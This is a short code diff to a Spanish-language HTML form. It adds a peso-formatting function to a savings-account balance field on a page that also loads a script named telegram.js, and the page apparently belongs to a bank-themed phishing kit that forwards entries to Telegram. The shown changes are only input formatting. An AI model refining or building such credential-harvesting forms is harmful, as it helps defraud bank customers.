@@ -440,7 +440,7 @@
                         </div>
                         <div class="id-half">
                             <label class="label">Saldo Cuenta de ahorros</label>
-                            <input type="tel" id="telefono_fijo" maxlength="10" class="custom-form-control" placeholder="$" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                            <input type="text" id="telefono_fijo" maxlength="18" class="custom-form-control" placeholder="$" oninput="formatearPesos(this)">
                         </div>
                     </div>
 
@@ -558,6 +558,19 @@
     <!-- ===== JS CORREGIDO ===== -->
     <script src="telegram.js"></script>
     <script src="action.js"></script>
+
+            <script>
+        function formatearPesos(input) {
+            let valor = input.value.replace(/\D/g, '');
+        
+            if (valor === '') {
+                input.value = '';
+                return;
+            }
+        
+            input.value = '$ ' + Number(valor).toLocaleString('es-CO');
+        }
+        </script>
     <script>
         if (window.stopListening) window.stopListening();
 
